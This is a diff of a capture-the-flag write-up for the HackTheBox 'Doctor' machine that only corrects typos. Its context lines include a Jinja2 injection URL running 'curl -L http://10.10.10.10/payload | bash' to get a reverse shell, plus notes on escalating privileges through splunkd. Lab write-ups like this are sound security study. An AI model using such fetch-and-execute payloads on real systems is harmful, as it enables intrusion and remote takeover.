@@ -170,11 +170,11 @@ After confirming that a Jinja2 payload should be used, would be possible to get 
   http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20bash
   ```
 
-- And voilá! A reverse shell was returned :smiley:
+- And voilà! A reverse shell was returned :smiley:
 
 ![image-20210117191626475](https://i.imgur.com/TyHFL9D.png){: .align-center}
 
-**Bonus** To make it easier regain initial foothold, once user account has a short validity of 20 minutes, I've created this python3 script to help on this task :smiley:.​ To use it just set up the listener and python web server, then the script will recreate the user, the message and then make the request to get the reverse shell again
+**Bonus** To make it easier regain initial foothold, once user account has a short validity of 20 minutes, I've created this python3 script to help on this task :smiley:. To use it just set up the listener and python web server, then the script will recreate the user, the message and then make the request to get the reverse shell again
 {: .notice--info}
 
 ```python
@@ -341,7 +341,7 @@ shaun@doctor:/tmp$ sudo -l
 Sorry, user shaun may not run sudo on d
 ```
 
-After running `linpeas.sh` from [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) the most proeminent way to get a root shell should be through **splunkd** service, which is published through TCP 8089 as previously noticed on nmap scans.
+After running `linpeas.sh` from [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) the most prominent way to get a root shell should be through **splunkd** service, which is published through TCP 8089 as previously noticed on nmap scans.
 
 After browsing it directly, once I have clicked in the **services** link, as image below, an authentication prompt was shown. As the only credential we had is shaun it was the first one tried, which resulted in success :smiley:.
 
